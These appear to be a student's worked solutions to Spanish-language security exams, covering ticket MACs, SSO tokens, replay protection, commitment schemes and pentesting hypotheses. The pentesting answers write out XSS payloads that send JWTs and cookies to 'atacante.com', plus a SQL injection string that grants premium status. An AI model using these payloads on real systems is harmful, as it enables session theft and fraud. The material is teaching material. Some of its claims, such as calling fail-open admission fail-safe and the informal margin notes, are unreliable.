# 2025 2C 2da Fecha

## Ejercicio 1

La empresa Pavota SAS ofrece sistemas de control de entradas para eventos (recitales, partidos, etc.) Uno de sus sistemas utiliza tickets impresos o digitales con un código QR.

El QR de cada entrada contiene la siguiente información: `(event_id, tipo_de_entrada, #ticket, mac)`, donde `event_id` es un identificador único por evento, `tipo_de_entrada` indica la zona (palco, vip, campo, etc.), `#ticket` es un número único que identifica a cada ticket, `mac = mac_{k_evento}(event_id || #ticket)` . Finalmente `k_event` es una clave simétrica de 128 bits definida para cada evento, conocida por el servidor y los lectores de QR.

En un escenario de mucha concentración de personas es normal que la señal de red funcione irregularmente, así que los lectores que se utilizan en cada acceso están pensados para poder operar incluso sin estar conectados al servidor.

El lector decodifica el QR, y verifica el `mac`. Si la verificación es exitosa, revisa que `tipo_de_entrada` corresponda al lugar de ingreso (por ejemplo, el lector usado en los ingresos vip solo permite tickets de ese tipo), avisa al servidor por un canal seguro para confirmar el acceso y si el servidor da el _ok_ permite avanzar. El servidor verifica que `#ticket` corresponde a un ticket emitido, y que no haya sido utilizado. Si no puede hacerse la conexión o la respuesta demora demasiado, el lector permitirá el ingreso y registrará en su memoria `#ticket`, para rechazar usos subsiguientes del mismo ticket. Una vez retomada la conexión, enviará los números de ticket procesados al servidor.

1. Debido a la autenticación del `mac`, un atacante no puede inventar números de serie de tickets. Explicar qué tipo de fraude si podría realizar abusando de fallas en el control de integridad y explicar cómo evitarlo. (1 pto).
2. Si un atacante consigue un lector y extrae la clave del evento, puede falsificar las entradas que quiera. Proponer un cambio para evitar que la extracción de claves del lector no permita este tipo de ataque. (1 pto).
3. En un evento hay 4 entradas a diferentes secciones, un lector en cada una. Explicar cómo minimizar el problema de que dos personas utilicen la misma entrada en dos puertas distintas en un escenario de inestabilidad de la red. (1 pto).

Respuesta

1. `(event_id, tipo_de_entrada, #ticket, mac)`  
    `mac = mac_{k_evento}(event_id || #ticket)`  
    El `tipo_de_entrada` no está incluido en el MAC así que un atacante puede comprar un ticket de _campo_ (la más barata) y cambiarlo por el tipo _vip_ y el MAC sigue siendo válido pues solo cubre `event_id || #ticket`, que no cambiaron.  
    Esto supone un problema de integridad pues la función del MAC es justamente garantizar que los datos de un ticket no hayan sido adulterados. Entonces, al no incluir `tipo_de_entrada`, no protege la integridad de dicho campo.  
    Para evitar este problema, la solución sería incluir `tipo_de_entrada` dentro del MAC también de la siguiente forma: `mac = mac_{k_evento}(event_id || tipo_de_entrada || #ticket)`
2. Para evitar que cualquier atacante con acceso a la clave del evento pueda generar tags válidos, se debe utilizar un esquema de **firma digital** donde el servidor es el único que genera las firmas con su clave privada, y los lectores únicamente tienen acceso a la clave pública del servidor, con el fin de verificar la integridad del ticket. Esto también alinea con el primer principio de Saltzer y Schroeder de **menor privilegio** ya que la única función de los lectores es verificar que los tickets no hayan sido falsificados.
3. En un escenario donde la red es inestable, los lectores no pueden consultar al servidor para verificar si un ticket ya fue utilizado en otra puerta. Esto genera un trade-off entre disponibilidad (permitir el ingreso sin conexión) e integridad (evitar el doble uso de un mismo ticket).  
    Para mitigar este problema se pueden implementar dos mecanismos complementarios. El primero es establecer una comunicación local entre los lectores de una misma sección (por ejemplo, mediante una red LAN o bluetooth) que no dependa de la conexión al servidor. Cuando un lector acepta un ticket offline, notifica a los demás lectores de su sección, de forma que si alguien intenta utilizar el mismo ticket en otra puerta, el segundo lector lo rechaza. El segundo mecanismo, como fallback en caso de que la comunicación local tampoco sea viable, es particionar los rangos de tickets por puerta dentro de cada sección, de forma que cada ticket solo sea válido en una puerta específica y no se requiera comunicación entre lectores.  
    El sistema actual prioriza la disponibilidad al permitir el ingreso sin conexión (alineado con el principio de fallar de forma segura de Saltzer y Schroeder), y estas medidas buscan recuperar la integridad del control sin sacrificar esa disponibilidad.

## Ejercicio 2

Copérnico SRL posee varias aplicaciones web internas y está diseñando un sistema de login unificado (**SSO**), que permita a sus empleados autenticarse una vez y poder utilizar todas las aplicaciones a las cuales tenga acceso.

Para eso ha decidido instalar un **Proveedor de Identidad (IdP)** que ofrece una aplicación web donde los usuarios pueden autenticarse. El IdP posee un par de claves `(sk, pk)` utilizadas para realizar firmas digitales. Todas las aplicaciones web conocen la clave pública `pk`.

Cuando un usuario llega a cualquier aplicación, si no posee una sesión válida, la aplicación redirige al usuario al IdP, donde se autentica. Cuando el proceso es exitoso (o si el usuario tiene una sesión ya activa en el IdP), el IdP construyen un _token_ `T = (id_usuario, servicio)`, donde `servicio` es el identificador el servicio que solicitó el _login_.

Luego calcula `S = Sign_{sk}(H(T))`, donde `Sign` es una firma digital resistente a falsificaciones y `H(.)` es una función de hash **libre de colisiones**. Finalmente, redirige al usuario a la página del servicio, enviando `T` y `S` como parámetros.

Los distintos servicios, ante la presencia de los parámetros `T` y `S`, verifican la firma `S` y si es válida y el servicio mencionado en el token es el mismo que está validando la firma, crean una sesión para el usuario.

1. Explicar por qué cada servicio no necesita conocer la contraseña del usuario para poder crearle una sesión y eso no tiene un impacto negativo en la seguridad.
2. ¿Cómo se puede mejorar el protocolo para evitar el escenario donde un atacante consiga de algún modo un par `T,S` válido e impersone al usuario que los generó en primer momento?
3. Un desarrollador propone optimizar el sistema eliminando el campo “servicio” del token. Desarrollar un ataque que explote esta modificación para ganar acceso a un sistema w’ robando un par de T,S que permiten acceso al sistema w. Asumir que las comunicaciones entre partes están correctamente protegidas por un canal TLS y explicar un posible escenario que le permite “robar” esos tokens.

**Respuesta**

1. Cada servicio no necesita conocer la contraseña del usuario porque la autenticación está centralizada en el IdP. El usuario se autentica únicamente ante el IdP con sus credenciales, y el IdP genera un token T firmado con su clave privada sk. Los servicios solo necesitan verificar la firma ejecutando `Vrfy_pk(H(T), S)`: calculan H(T) por su cuenta y verifican que S sea una firma válida de ese hash usando la clave pública pk del IdP. Si la verificación pasa, el servicio tiene la certeza de que el token fue generado por el IdP (ya que solo el IdP posee sk) y por lo tanto el usuario fue autenticado legítimamente.  
    Esto no tiene un impacto negativo en la seguridad, sino que la mejora. En un modelo tradicional sin SSO, cada servicio tendría que almacenar y gestionar contraseñas, lo cual multiplica la superficie de ataque: si cualquiera de los servicios es comprometido, las credenciales quedan expuestas. Al centralizar la autenticación en el IdP, se reduce esa superficie a un único punto. Además, los servicios solo poseen pk, que es información pública — incluso si un servicio es comprometido, el atacante no obtiene nada útil para falsificar tokens.  
    Esto se alinea con el principio de menor privilegio de Saltzer y Schroeder: cada servicio tiene solo la información mínima necesaria (pk) para cumplir su función, sin acceso a credenciales ni a la clave privada del IdP.
2. El ataque que se busca prevenir es un **replay attack**: un atacante que consigue un par (T, S) válido puede reenviarlo tal cual al servicio para hacerse pasar por el usuario legítimo.  
    Para evitarlo, se agrega un timestamp al token: `T = (id_usuario, servicio, timestamp)`, y se firma como antes: `S = Sign_sk(H(T))`.  
    Ahora el servicio, además de verificar la firma y el campo servicio, chequea que el timestamp esté dentro de una ventana de tiempo aceptable (por ejemplo, unos pocos minutos). Si el token es viejo, lo rechaza.  
    Si el atacante intenta reenviar el par (T, S) después de que la ventana expiró, el servicio lo rechaza por timestamp vencido. Y el atacante no puede modificar el timestamp para extender la validez, porque cualquier cambio en T invalida la firma S, y generar una firma nueva requiere sk, que solo posee el IdP.  
    Esto es análogo a la mejora de Denning-Sacco sobre Needham-Schroeder, donde se agregan timestamps a los tickets para reducir la ventana de ataque por replay.
3. Sin el campo servicio, el token queda como `T = (id_usuario)` y `S = Sign_sk(H(T))`. Este par es válido para **cualquier servicio**, ya que lo único que verifican los servicios es que la firma sea válida para ese id_usuario — no hay nada que vincule el token a un servicio específico.  
    **El ataque:** Un usuario se autentica legítimamente en el servicio w. El IdP genera el par (T, S) y lo envía al servicio w. El administrador malicioso de w ahora tiene ese par, y como no contiene campo servicio, puede tomar (T, S) y presentarlo ante el servicio w', ganando acceso como si fuera el usuario original. Puede repetir esto con cualquier servicio que confíe en la pk del IdP.  
    **Escenario de robo con TLS:** Si bien TLS protege los datos en tránsito (nadie puede interceptar el token en el canal), una vez que el par (T, S) llega al servicio w, queda almacenado en el servidor — en logs, en memoria, en base de datos de sesiones. El administrador del servicio w tiene acceso completo a su propio servidor y puede extraer el par (T, S) de ahí. TLS no protege contra esto porque el dato ya llegó a destino.  
    Por eso el campo servicio es esencial: con `T = (id_usuario, servicio)`, un token generado para w no sería válido para w', porque el servicio w' verificaría que el campo servicio coincida consigo mismo y lo rechazaría.

## Ejercicio 3

La empresa _**CriptoTotal**_ ofrece una aplicación web y móvil para que los usuarios puedan ver, en un solo lugar, sus inversiones en distintas criptomonedas realizadas en múltiples exchanges.

El registro se hace con email y contraseña, con opción de activar un segundo **factor de autenticación** que envía **códigos de uso único por SMS**.

- si no se sanitiza el input puede haber xss
- provee autenticación multifactor apropiada (algo que conozco (contraseña) y algo que tengo (celular))

El usuario puede vincular cuentas de distintos exchanges (por ejemplo Trinance, Saken, Rupio) cargando sus **_API keys_ y _secret keys_**. La documentación comercial afirma que “las **claves se almacenan cifradas en nuestra base de datos**”.

- si las api keys y secret keys quedan registradas en logs de la aplicación web o móvil, se puede revelar toda la información

Periódicamente, **un servicio _backend_ consulta las _API_s de los _exchanges_** vinculados, descarga balances de movimientos y los guarda en una **base de datos relacional**.

- para consultar las APIs debe tener acceso también a los secret keys, y no hay información sobre si quedan guardadas de forma cifrada en dicha base de datos relacional → sql injection prone

La aplicación utiliza _tokens JWT_ para manejar la sesión del usuario. El _frontend_ (_single page app_ en _Javascript_, que corre en el navegador de cada usuario) almacena el _JWT_ en _localStorage_ y lo envía en el `header Authorization: Bearer`… en cada _request_ al _API_ _REST_.

- mandar el token en el header está bien supongo

Existe un **panel de administració**n al que acceden empleados de soporte para ver el estado de las cuentas, saldos agregados, últimos accesos y errores de sincronización.

La versión “_premium_” de la app se paga por suscripción mensual a través de un **proveedor de pagos** - la app redirige al proveedor y este último controla todo el flujo de checkout, captura de información de pago y ejecución. Al confirmarse el pago, se marca en una tabla la cuenta del usuario como `premium = true` y se habilitan funciones adicionales (reportes históricos, alertas por precio, etc).

- marcar simplemente en una tabla como premium = true no es safe pues cualquiera puede inyectar código o cambiar el texto a false / true

En función de la descripción del sistema, establecer 4 hipótesis de falla plausibles siguiendo la metodología de _pentesting_. Por cada hipótesis definir una prueba siguiendo los lineamientos de la metodología.

**Aclaración**: No utilizar problemas genéricos como hipótesis de falla. Plantear situaciones y lugares concretos donde podría estar el problema. Por ejemplo, en lugar de decir “puede haber un buffer overflow”, decir “es probable que haya un buffer overflow en la lectura del parámetro x que debe interpretarse como número y puede tener un buffer pequeño dado que los números esperados tienen menos de 4 dígitos”.

---

Componentes y vulnerabilidades comunes:

- app móvil y web - XSS en registro
- API de exchanges y sus secret keys - está cifrado asi que ok
- BD relacional - SQL injection
- servicio backend - SSRF
- proveedor de pagos externo
- tabla de cuentas de usuarios con un registro premium = true - sensitive data exposure

Elegir 4 que sean específicas al caso (cubrir diferentes componentes y categorías).  
Para cada una escribir: Qué (nombre), Por qué (justificación específica al sistema), Cómo (prueba concreta), Impacto (qué puede hacer el atacante).

**Hipótesis 1: XSS → Robo de JWT → Session Hijacking**

- **Qué:** Cross-Site Scripting (XSS) almacenado que permite robar el token JWT del usuario.
- **Por qué:** El frontend guarda el JWT en localStorage, que es accesible desde cualquier script JavaScript que se ejecute en la página. Si algún campo de input no está sanitizado (por ejemplo, el nombre de usuario en el registro, o campos que se muestran en el panel de administración), un atacante puede inyectar código malicioso que se ejecuta en el navegador de otros usuarios.
- **Cómo:** El atacante se registra con un nombre como `<script>fetch('<https://atacante.com/?token='+localStorage.getItem('jwt>'))</script>`. Cuando un empleado de soporte abre el panel de administración y ve la lista de usuarios, el script se ejecuta en su navegador y envía el JWT del empleado al servidor del atacante.
- **Impacto:** Con el JWT del empleado de soporte, el atacante accede al panel de administración, pudiendo ver saldos, datos de cuentas, últimos accesos y errores de sincronización de todos los usuarios. Esto representa tanto sensitive data exposure como escalamiento de privilegios.

**Hipótesis 2: SQL Injection → Escalamiento a Premium**

- **Qué:** SQL Injection en el panel de administración.
- **Por qué:** El panel de administración permite a empleados buscar cuentas por distintos criterios (usuario, estado, errores). Estas búsquedas probablemente generan queries a la base de datos relacional donde se almacenan los datos de los usuarios, incluyendo el campo `premium`.
- **Cómo:** Un empleado malicioso (o un atacante que robó el JWT de un empleado — encadenando con la hipótesis 1) ingresa en el campo de búsqueda algo como: `' OR 1=1; UPDATE usuarios SET premium = true WHERE email = 'atacante@mail.com'; --`. Se verifica si la query se ejecuta y el campo premium cambia.
- **Impacto:** El atacante obtiene acceso premium sin pagar, habilitando reportes históricos, alertas por precio y todas las funciones adicionales.

**Hipótesis 3: Broken Access Control — Panel de administración**

- **Qué:** Falta de verificación de roles en los endpoints del panel de administración.
- **Por qué:** El enunciado menciona que existe un panel de administración para empleados de soporte, pero no describe ningún mecanismo que diferencie el JWT de un usuario común del de un empleado. Si los endpoints del panel solo verifican que el JWT sea válido, sin chequear el rol del usuario, cualquier usuario autenticado podría acceder.
- **Cómo:** Un usuario común, con su JWT válido, intenta hacer requests directamente a los endpoints del panel de administración (por ejemplo `GET /api/admin/usuarios`, `GET /api/admin/saldos`). Si el servidor responde con datos en lugar de un error 403 (Forbidden), la hipótesis se confirma.
- **Impacto:** Un usuario común puede ver datos de todos los usuarios: saldos, últimos accesos, errores de sincronización y estado de cuentas. Esto representa sensitive data exposure y violación del principio de menor privilegio.

**Hipótesis 4: JWT sin expiración — Sesión permanente**

- **Qué:** El token JWT no tiene expiración ni mecanismo de revocación.
- **Por qué:** El enunciado describe que el JWT se almacena en localStorage y se envía en cada request, pero no menciona expiración, refresh tokens ni mecanismo de invalidación. Si el JWT no expira, una vez obtenido es válido indefinidamente.
- **Cómo:** Se inspecciona el JWT (es base64, se puede decodificar fácilmente) y se verifica si tiene un campo `exp` (expiración). Si no lo tiene, se prueba usar un JWT obtenido hace días o semanas y se verifica si el servidor lo sigue aceptando.
- **Impacto:** Si se combina con la hipótesis 1 (XSS → robo de JWT), el atacante obtiene acceso permanente a la cuenta de la víctima. Incluso si el usuario cambia su contraseña, el JWT robado seguiría siendo válido ya que no hay forma de revocarlo. Esto viola el principio de CSRF/sesiones seguras y amplifica el impacto de cualquier filtración de tokens.

# 2025 1C

## Ejercicio 1 — Sistema de transporte de valores

Una empresa de transporte de valores utiliza el siguiente sistema para monitorear objetos de valor en tránsito:

- Cada camión tiene un **controlador** atornillado al vehículo.
- Cada ítem de valor va acompañado de un **emisor** que debe estar en contacto físico con el objeto (tocándose, no pegados).
- Los emisores y el controlador se comunican mediante **Bluetooth** (cualquiera que escuche esa frecuencia puede ver los mensajes).
- Cada emisor envía periódicamente la siguiente trama:

`BEACON | id_emisor | CTR | Enc_k(status)`

Donde `status` indica si el emisor está o no en contacto físico con el objeto de valor. `CTR` es un contador y `Enc_k` es un cifrado con clave compartida entre el emisor y el servidor.

- El controlador del camión, al detectar una trama que comienza con `BEACON`, la captura y la retransmite a un servidor central.

**Preguntas:**

1. ¿Cómo puede darse cuenta el servidor de que se llevaron el ítem de valor y dejaron el emisor? ¿Y cómo puede darse cuenta si se llevan las dos cosas (ítem + emisor)?
    
    - **Se llevan el ítem y dejan el emisor:** El emisor detecta que ya no está en contacto con el objeto y envía la trama con `status = sin contacto`. El servidor recibe esto y sabe que el ítem fue separado del emisor → dispara alarma.
    - **Se llevan ambos (ítem + emisor):** El emisor sale del rango Bluetooth del controlador del camión. El controlador deja de recibir tramas de ese emisor. El servidor detecta que un emisor que debería estar reportando dejó de hacerlo → dispara alarma por ausencia de señal.
2. ¿Cómo puede un atacante que tiene acceso a un dispositivo Bluetooth robar un ítem de valor sin que el servidor se entere? ¿Cómo se podría solucionar?
    
    **El ataque:** El atacante escucha el Bluetooth (que es público) y captura una trama legítima con status = contacto. Luego se lleva el ítem de valor y con su dispositivo Bluetooth reenvía la trama capturada repetidamente. El controlador la retransmite al servidor, que cree que todo está bien.
    
    **La solución:** El servidor guarda el último CTR recibido de cada emisor y verifica que cada nuevo CTR sea estrictamente mayor al anterior. Si recibe un CTR igual o menor, rechaza el mensaje como replay.
    
    El CTR debe ir tanto en plano como dentro del cifrado: `BEACON | id_emisor | CTR | Enc_k(status || CTR)`. El servidor:
    
    1. Lee el CTR en plano y verifica que sea mayor al último registrado
    2. Descifra y compara el CTR interno con el externo para detectar manipulación
    3. Si el atacante intenta modificar el CTR externo para incrementarlo, no coincidirá con el CTR interno cifrado y el servidor lo rechaza
    
    El atacante no puede modificar el CTR interno porque está cifrado con una clave que no conoce.
    
3. Si un atacante emite un mensaje con bytes arbitrarios (modificando la trama), el servidor dispara alarmas falsas. ¿Qué validación extra podría tener el servidor para evitar esto?
    
    **El problema:** Un atacante puede enviar tramas con bytes arbitrarios por Bluetooth. El controlador las captura y las retransmite al servidor, que al intentar procesarlas genera alarmas falsas.
    
    **La solución:** Agregar un MAC que cubra **toda la trama**:
    
    `BEACON | id_emisor | CTR | Enc_k(status || CTR) | MAC_k'(BEACON || id_emisor || CTR || Enc_k(status || CTR))`
    
    El MAC debe cubrir todos los campos (BEACON, id_emisor, CTR y la parte cifrada) para que el atacante no pueda modificar ninguna parte del mensaje. La clave del MAC (k') debe ser distinta a la clave de cifrado para mantener CCA-security, o alternativamente se puede reemplazar todo el esquema por AES-GCM.
    
    El servidor, antes de procesar cualquier trama, verifica el MAC. Si no es válido, descarta el mensaje silenciosamente sin disparar alarma. Solo procesa y evalúa el status de tramas con MAC válido.
    

## Ejercicio 2 — Commitment Scheme

Se utiliza un esquema de compromiso (commitment scheme) donde:

- **Fase de compromiso:** A envía a B: `h(m)`, donde `h` es una función de hash resistente a colisiones.
- **Fase de revelación:** A envía a B: `m`. B verifica que `h(m)` coincida con lo recibido anteriormente.

**Preguntas:**

1. ¿Cómo podría un atacante enviar `h(m)` al principio y después revelar un mensaje `m' ≠ m` sin ser detectado?
    
    Para hacer esto, el atacante necesitaría encontrar m' ≠ m tal que h(m') = h(m). Es decir, necesita encontrar una **colisión** en la función de hash. Pero como el enunciado dice que h es resistente a colisiones, esto es computacionalmente inviable. Por lo tanto, **no es posible** engañar a B si la función de hash es resistente a colisiones. Esto es la propiedad de **binding** del commitment scheme.
    
2. ¿Por qué no se puede usar este esquema para un juego donde alguien saca una carta del 1 al 39 y el otro tiene que adivinar cuál era?
    
    Porque el espacio de mensajes es muy chico. B recibe h(m) y sabe que m es un número entre 1 y 39. Lo único que tiene que hacer es calcular los 39 hashes: h(1), h(2), ..., h(39) y comparar con el h(m) que recibió. Va a encontrar el que coincida y saber qué carta sacó A antes de que la revele.
    
    Esto rompe la propiedad de **hiding** del commitment scheme. El hash es resistente a preimagen cuando el espacio de mensajes es grande, pero con solo 39 valores posibles la fuerza bruta es trivial.
    
    **¿Cómo se solucionaría?** A podría agregar un nonce aleatorio: enviar `h(m || r)` donde r es un valor aleatorio largo. En la fase de revelación, A envía m y r. Ahora B no puede hacer fuerza bruta porque tendría que probar las 39 cartas multiplicado por todos los posibles valores de r, lo cual es inviable.
    
3. Si A tiene que emitir una decisión binaria (sí/no), ¿puede la otra parte saber de antemano cuál era la decisión si se envía `h(Enc_k(m))`?
    
    Depende de quién conoce la clave k:
    
    - **Si B no conoce k:** No puede saber la decisión. Aunque el espacio de mensajes es chico (solo "sí" y "no"), B necesitaría calcular Enc_k("sí") y Enc_k("no") para comparar los hashes, pero sin k no puede hacerlo. El cifrado actúa como el nonce aleatorio del punto anterior — agrega imprevisibilidad que B no puede replicar. Se mantiene la propiedad de **hiding**.
    - **Si B conoce k:** Puede calcular h(Enc_k("sí")) y h(Enc_k("no")), comparar con lo recibido, y saber la decisión de antemano. En este caso se rompe el hiding, igual que con las cartas del 1 al 39.

---

## Ejercicio 3 — App móvil de experiencias curadas

Una aplicación móvil permite a los usuarios descubrir y reservar experiencias curadas. El sistema tiene los siguientes componentes:

- **App móvil** que se comunica con el backend a través de una **API REST**.
- **Autenticación** mediante **OAuth**.
- **Sistema de pagos externo** (tipo Stripe) para procesar las reservas.
- Los creadores de experiencias pueden publicar sus ofertas.
- Los usuarios pueden dejar **reviews** sobre las experiencias.

**Pregunta:**

Establecer 4 hipótesis de falla plausibles siguiendo la metodología de pentesting. Para cada hipótesis, definir una prueba concreta.

**Hipótesis 1: XSS a través de las reviews**

- **Qué:** Cross-Site Scripting almacenado en las reviews de experiencias.
- **Por qué:** Los usuarios pueden escribir texto libre en las reviews, y ese contenido se muestra a otros usuarios que visitan la experiencia. Si el input no está sanitizado, un atacante puede inyectar JavaScript.
- **Cómo:** Un atacante deja una review con contenido: `<script>fetch('<https://atacante.com/?token='+document.cookie>)</script>`. Cuando otros usuarios ven la experiencia, el script se ejecuta en sus navegadores y envía sus datos de sesión al atacante.
- **Impacto:** El atacante roba sesiones de otros usuarios y puede operar como ellos — reservar experiencias, dejar reviews falsas, acceder a datos personales.

---

**Hipótesis 2: Falsificación de confirmación de pago**

- **Qué:** Falta de validación server-side en la confirmación de pago del proveedor externo.
- **Por qué:** El sistema de pagos es externo (tipo Stripe). Cuando el usuario completa el pago, el proveedor notifica al backend (generalmente vía webhook o redirect). Si el backend no valida que la notificación realmente viene del proveedor de pagos, un atacante puede simularla.
- **Cómo:** El atacante inicia el flujo de pago, intercepta la comunicación con un proxy (como Burp Suite), y en lugar de completar el pago, envía directamente al backend una request simulando la confirmación exitosa del proveedor. Se verifica si el backend acepta la reserva sin pago real.
- **Impacto:** El atacante reserva experiencias sin pagar, generando pérdidas económicas para los creadores y la plataforma.

---

**Hipótesis 3: Broken Access Control en la API REST**

- **Qué:** Falta de verificación de autorización en endpoints de la API.
- **Por qué:** La app móvil se comunica con el backend a través de una API REST. Es común que la API tenga endpoints para gestionar experiencias (crear, editar, eliminar) que deberían ser exclusivos del creador. Si los endpoints solo verifican que el usuario esté autenticado pero no que sea el dueño del recurso, cualquier usuario autenticado podría modificar experiencias ajenas.
- **Cómo:** Un usuario autenticado intercepta el request de edición de su propia experiencia con un proxy, cambia el `id_experiencia` por el de otra experiencia, y envía el request. Si el servidor acepta la modificación, la hipótesis se confirma. También se prueba: `DELETE /api/experiencias/{id_ajeno}` y `PUT /api/reviews/{id_review_ajena}`.
- **Impacto:** Un atacante puede modificar o eliminar experiencias de otros creadores, alterar o borrar reviews, y manipular la información de la plataforma.

---

**Hipótesis 4: Intercepción de tráfico en la app móvil (MITM)**

- **Qué:** Falta de certificate pinning en la app móvil.
- **Por qué:** La app móvil se comunica con la API REST por HTTPS, pero si la app no implementa **certificate pinning**, un atacante puede instalar un certificado propio en el dispositivo y usar un proxy para interceptar todo el tráfico entre la app y el servidor.
- **Cómo:** Se configura un emulador con un proxy (como Burp Suite o Wireshark en la interfaz virtual), se instala el certificado del proxy en el dispositivo, y se observa si se puede interceptar y leer el tráfico HTTPS entre la app y la API. Si la app no valida el certificado específico del servidor (no tiene pinning), todo el tráfico queda visible.
- **Impacto:** El atacante puede ver tokens de OAuth, datos personales, información de pago, y toda la comunicación entre la app y el servidor. También puede modificar requests en tránsito para manipular reservas, reviews o pagos.

# 21-07-2025

## Ejercicio 1 — Sistema de sensores de seguridad en expo de joyas (MALBA)

Una exposición de joyas en el MALBA cuenta con distintas vidrieras, cada una equipada con un sensor de vibraciones. Los sensores se comunican entre sí inalámbricamente con un alcance de 2 metros.

Cada sensor envía una señal cada 2 segundos con la siguiente estructura:

`Header || id_sensor || estado || id_sensor_extra`

Los estados posibles son:

- **Stand by:** estado inicial cuando el sensor se enciende.
- **Armed:** estado activo de vigilancia.
- **Alert:** estado de alerta.

El comportamiento de los sensores es el siguiente:

- Cuando un sensor recibe un mensaje de un vecino (dentro del rango de 2m) con estado `armed` o `alert`, cambia su propio estado a `armed` o `alert` y setea `id_sensor_extra` al id del sensor que provocó el cambio.
- Si un sensor deja de recibir la señal de uno de sus vecinos por más de 4 segundos, pasa a estado `alert` con `id_sensor_extra` seteado al id del sensor que dejó de emitir.
- Existe un **sensor maestro** que se comunica directamente con la central de control y es el que inicia la cadena enviando la primera señal de `armed`.

Cada sensor posee un par de claves (sk, pk) para firma digital.

**Preguntas:**

a) Asumiendo que todos los sensores conocen la clave pública de sus vecinos, ¿cómo modificaría la señal para evitar que un atacante pueda copiar el mensaje de un sensor, destruirlo, y empezar a emitir la señal copiada por su cuenta de forma que parezca que el sensor sigue activo?

**El ataque:** El atacante captura una señal legítima de un sensor, lo destruye físicamente, y emite la señal copiada cada 2 segundos con su propio dispositivo. Los sensores vecinos siguen recibiendo la señal y creen que el sensor sigue activo → no pasan a estado alert → el atacante puede robar las joyas de esa vidriera sin que se dispare la alarma.

**La solución:** Modificar la señal para incluir una firma digital y un counter:

`Header || id_sensor || estado || id_sensor_extra || CTR || Sign_sk(Header || id_sensor || estado || id_sensor_extra || CTR)`

- **Firma digital:** cada sensor firma su señal con su sk. Los vecinos, que conocen la pk del sensor, verifican la firma antes de aceptar el mensaje. El atacante no puede generar firmas válidas sin la sk del sensor (que se destruyó junto con él).
- **Counter:** el sensor incrementa el CTR con cada señal enviada. Los vecinos guardan el último CTR recibido de cada sensor y verifican que el nuevo sea estrictamente mayor. Si el atacante reenvía una señal capturada, el CTR será igual o menor al último registrado y los vecinos la rechazan.

Se usa counter en lugar de timestamp porque los sensores probablemente no tengan un reloj sincronizado confiable. El counter es un mecanismo más robusto para este caso.

Si el atacante intenta modificar el CTR para incrementarlo, la firma digital se invalida y los vecinos rechazan el mensaje.

b) Asumiendo que los sensores no conocen inicialmente la clave pública de sus vecinos, ¿cómo haría para que los sensores puedan descubrir esas claves? ¿Se puede validar la integridad de las claves públicas recibidas?

**¿Cómo descubrir las pk de los vecinos?**

En una fase inicial de setup (antes de pasar a estado armed), cada sensor hace broadcast de su clave pública:

`Header || id_sensor || pk_sensor`

Los sensores vecinos (dentro del rango de 2m) reciben este mensaje y almacenan la asociación `id_sensor → pk`. Una vez que el sensor maestro envía la señal de `armed`, la fase de descubrimiento termina y los sensores solo aceptan mensajes firmados.

**¿Se puede validar la integridad de las claves públicas recibidas?**

**No, no de forma confiable.** Sin una autoridad de confianza (PKI/certificados) ni conocimiento previo de las claves, no hay forma de garantizar que la pk recibida sea legítima. Un atacante podría:

1. Posicionar un dispositivo dentro del rango de 2m durante la fase de setup
2. Hacer broadcast de su propia pk haciéndose pasar por un sensor legítimo
3. Los vecinos aceptarían esa pk falsa sin poder distinguirla de una real

Esto es esencialmente un ataque de **MITM/masquerading** en la fase de descubrimiento. Para solucionarlo se necesitaría una PKI (certificados firmados por una autoridad de confianza) o una distribución manual previa de las claves públicas, pero el enunciado dice que no se puede modificar el protocolo.

La única mitigación parcial sería que la fase de setup ocurra en un momento controlado (cuando se instalan los sensores) y que luego no se acepten nuevas pk → si un atacante no estuvo presente durante la instalación, no puede inyectar su pk después.

---

## Ejercicio 2 — Commitment Scheme con XOR y PRG

Se tiene un protocolo de commitment scheme entre dos usuarios A y B. Este protocolo permite a A elegir un valor sin mostrárselo a B, y luego de un tiempo revelarlo para que B pueda corroborar que el mensaje revelado fue efectivamente el que A había elegido originalmente.

**El protocolo:**

- **Setup:** A elige una clave k (nueva para cada mensaje) y genera `r = G(k)` donde G es un generador pseudoaleatorio.
- **Fase de compromiso:** A elige un mensaje m, calcula `c = m ⊕ r`, y envía c a B.
- **Fase de revelación:** A envía `(m, r)` a B. B verifica calculando `Decommit(m, r)`: acepta si `c = m ⊕ r`, rechaza si no.

**Preguntas:**

a) Si B tiene c, ¿puede conocer m o parte de m?

No. B tiene c = m ⊕ r, donde r = G(k) es la salida de un generador pseudoaleatorio. Sin conocer k ni r, B no puede recuperar ninguna información sobre m. Es análogo al OTP: el XOR con un valor pseudoaleatorio oculta completamente el mensaje. Se mantiene la propiedad de **hiding**.

b) ¿Puede A falsificar un mensaje? Es decir, ¿puede enviar un `m' ≠ m` (y su correspondiente `r'`) en la fase de revelado de forma que B no pueda detectar que mintió?

Sí. A puede elegir cualquier m' ≠ m y calcular r' = c ⊕ m'. Cuando B verifica:

`m' ⊕ r' = m' ⊕ (c ⊕ m') = c`

La verificación pasa y B no puede detectar que A mintió. Esto es posible porque A tiene libertad total para elegir cualquier par (m', r') que satisfaga c = m' ⊕ r'. El esquema **no tiene binding** cuando se revela r, ya que para cualquier mensaje m' existe un r' válido.

c) ¿Cómo modificaría el protocolo para que en la fase de revelado se envíe k en lugar de r? ¿Qué efecto tiene esto sobre la capacidad de falsificación de A?

Se modifica la fase de revelación: A envía (m, k) en lugar de (m, r). B calcula r = G(k) por su cuenta y verifica que c = m ⊕ G(k).

Esto **fortalece el binding** y A ya no puede falsificar. Para enviar un m' ≠ m válido, A necesitaría encontrar un k' tal que G(k') = c ⊕ m'. Es decir, necesitaría encontrar un k' que produzca exactamente el r' que necesita. Pero el generador pseudoaleatorio G no es invertible: dado un valor de salida deseado, no se puede encontrar la entrada que lo produce. A tendría que probar k' al azar hasta que G(k') coincida con c ⊕ m', lo cual es computacionalmente inviable.

En resumen: revelar r le da a A libertad total para falsificar (elige r' directamente), pero revelar k obliga a A a invertir el PRG para falsificar, lo cual es imposible. **Enviar k en lugar de r le da binding al esquema.**

---

## Ejercicio 3 — Votame SRL (4 hipótesis de falla)

La empresa Votame SRL ofrece servicios de votación para productoras de televisión. El sistema funciona de la siguiente manera:

- Los clientes (productores) se registran y acceden a una **aplicación web** con su cuenta.
- Pueden **crear campañas de votación** definiendo: las opciones de voto, la duración de la campaña, y el tipo de votación (telefónica o por QR).
- Al crear una campaña:
    - Si es **telefónica:** se envía por mail el número de teléfono al que los votantes deben enviar mensajes y el mensaje correspondiente a cada opción.
    - Si es **por QR:** se envía por mail un código QR para cada opción de voto.
